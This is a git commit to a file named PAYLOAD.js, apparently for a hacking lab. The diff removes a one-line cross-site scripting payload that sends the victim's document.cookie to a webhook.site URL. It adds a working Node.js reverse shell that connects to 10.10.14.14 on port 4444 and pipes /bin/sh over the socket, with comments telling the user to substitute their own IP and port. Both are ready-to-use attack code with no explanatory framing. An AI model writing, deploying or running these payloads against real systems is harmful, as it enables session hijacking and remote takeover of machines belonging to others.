8efd31f11910a17da6aa95142ae12d23d733838c
BedtimeXXX <165554897+BedtimeXXX@users.noreply.github.com>
2024-12-01 10:21:27 +0000

    Update PAYLOAD.js

--- PAYLOAD.js
+++ PAYLOAD.js
@@ -1,1 +1,28 @@
-fetch('https://webhook.site/b49551b4-cf2a-4263-abe6-8d802b94fe47?cookie='+document.cookie);
+const net = require("net");
+const { spawn } = require("child_process");
+
+const HOST = "10.10.14.14";  // Replace with your IP
+const PORT = 4444; // Replace with your listening port
+
+const client = new net.Socket();
+client.connect(PORT, HOST, () => {
+    const sh = spawn("/bin/sh", []);
+    client.write("Connected!\n");
+
+    client.on("data", (data) => {
+        sh.stdin.write(data);
+    });
+
+    sh.stdout.on("data", (data) => {
+        client.write(data);
+    });
+
+    sh.stderr.on("data", (data) => {
+        client.write(data);
+    });
+
+    client.on("close", () => {
+        process.exit(0);
+    });
+});
+
